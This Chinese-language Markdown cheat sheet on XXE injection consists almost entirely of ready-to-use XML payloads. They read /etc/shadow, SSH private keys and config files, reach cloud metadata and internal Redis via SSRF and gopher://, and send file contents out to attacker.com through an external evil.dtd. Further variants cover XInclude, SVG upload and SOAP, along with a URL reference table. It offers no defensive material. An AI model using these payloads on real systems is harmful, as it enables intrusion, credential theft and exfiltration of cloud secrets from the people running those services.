# XXE 注入实战参考
- XXE 可触发 SSRF 探测内网 → `web-ssrf.md`
- XXE 与反序列化组合利用 → `web-deser.md`

> 分类: 文件读取 → SSRF → Blind XXE → 参数实体 → XInclude → 文件上传 → SOAP

> **last_updated**: 2026-06-04 | **tested_against**: Java 17, PHP 8.x, .NET 6, libxml2 2.9+
---

## 1. XXE 基础检测

### 1.1 检测 Payload

```xml
<!-- 基础检测 — 定义实体 + 引用 -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe "XXE_TEST">
]>
<root>&xxe;</root>

<!-- 如果返回 "XXE_TEST" → XXE 确认 -->

<!-- 文件读取检测 -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### 1.2 常见 XXE 入口

```
- XML API:         POST /api/data → Content-Type: application/xml
- SOAP WebService: POST /service → Content-Type: text/xml
- SVG 上传:        <svg> 含 XXE payload
- Office 文档:     DOCX/XLSX 本质是 XML (解压后可修改)
- RSS/Atom Feed:   RSS XML 解析
- SAML 认证:       SAML Response XML
- PDF 生成:        XSL-FO → Apache FOP
```

---

## 2. 文件读取

### 2.1 读取敏感文件

```xml
<!-- === Linux === -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- === 常见敏感文件 === -->
file:///etc/passwd
file:///etc/shadow
file:///root/.ssh/id_rsa
file:///var/www/html/config.php
file:///proc/self/environ

<!-- === Windows === -->
file:///C:/Windows/win.ini
file:///C:/inetpub/wwwroot/web.config
file:///C:/xampp/htdocs/config.php

<!-- === 带特殊字符的路径 → PHP wrapper === -->
php://filter/convert.base64-encode/resource=config.php
```

### 2.2 目录枚举

```xml
<!-- 无目录列表 → 用报错信息判断 -->
<!ENTITY xxe SYSTEM "file:///var/www/html/">

<!-- 部分解析器会返回目录列表 (罕见) -->
```

---

## 3. SSRF via XXE

```xml
<!-- 内网探测 -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- 内网端口扫描 (按响应时间差异) -->
<!ENTITY port22 SYSTEM "http://127.0.0.1:22/">
<!ENTITY port80 SYSTEM "http://127.0.0.1:80/">
<!ENTITY port3306 SYSTEM "http://127.0.0.1:3306/">

<!-- Gopher 协议 (攻击内网 Redis/MySQL/FastCGI) -->
<!ENTITY redis SYSTEM "gopher://127.0.0.1:6379/_*1%0d%0a...">
```

---

## 4. Blind XXE (Out-of-Band)

### 4.1 原理

```
正常 XXE: 请求 → 返回文件内容 (有回显)
Blind XXE: 请求 → 不返回内容, 但服务端会发起外部请求

利用: 参数实体 + DTD 外带数据
```

### 4.2 外带 DTD

```xml
<!-- 主请求 (发给目标) -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
  %send;
]>
<root>test</root>
```

**攻击者服务器上的 `evil.dtd`：**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%send;
```

### 4.3 Blind XXE 踩坑

```
1. % 编码: 在内部子集中 % 不能用于实体引用，需外部 DTD
2. 换行符: file:// 读取的内容含换行 → URL中非法 → 需 PHP base64 encode
3. 长度限制: URL 长度有限 → 分段外带

# PHP base64 外带 DTD:
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?d=%file;'>">
```

### 4.4 本地 DTD 利用

```xml
<!-- 当不允许外联 DTD → 用目标本机的 DTD 文件 -->

<!-- Linux: 覆盖系统DTD中的实体 -->
<!DOCTYPE root [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % expr 'AAA)> 
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; exfil SYSTEM 'http://attacker/?d=%file;'>">
    %eval;
    %exfil;
  <!ELEMENT aa (BB'>
  %local_dtd;
]>
<root></root>
```

---

## 5. XInclude 注入

```xml
<!-- 无法控制整个 XML, 只能注入部分内容时 -->
<!-- 原始: <root><foo>用户输入</foo></root> -->
<!-- 用户输入: -->

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

<!-- 或者: -->
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>
```

---

## 6. SVG 文件上传 XXE

```xml
<!-- 上传到允许 SVG 的目标 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="0" y="20" font-size="20">&xxe;</text>
</svg>

<!-- Blind — 外带数据 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://attacker.com/log">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <rect width="1" height="1" style="fill:url(&xxe;)"/>
</svg>
```

---

## 7. SOAP API XXE

```xml
<!-- SOAP 1.1 -->
<?xml version="1.0"?>
<!DOCTYPE soap [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser xmlns="http://target.com/">
      <id>&xxe;</id>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

---

## 8. XXE URL 参考表

```
# 文件读取:
file:///etc/passwd
file:///etc/shadow
file:///C:/Windows/win.ini

# PHP Wrapper:
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=/etc/passwd
expect://id          (需 expect 扩展)

# OOB:
http://attacker.com/
ftp://attacker.com/

# 攻击内网:
http://169.254.169.254/latest/meta-data/
gopher://127.0.0.1:6379/_*1...
dict://127.0.0.1:11211/stat
```

---
## 相关参考
- XXE 可触发 SSRF 探测内网 → `web-ssrf.md`
- XXE 与反序列化组合利用 → `web-deser.md`

*参考: OWASP XXE + PayloadAllTheThings XXE + PortSwigger XXE*
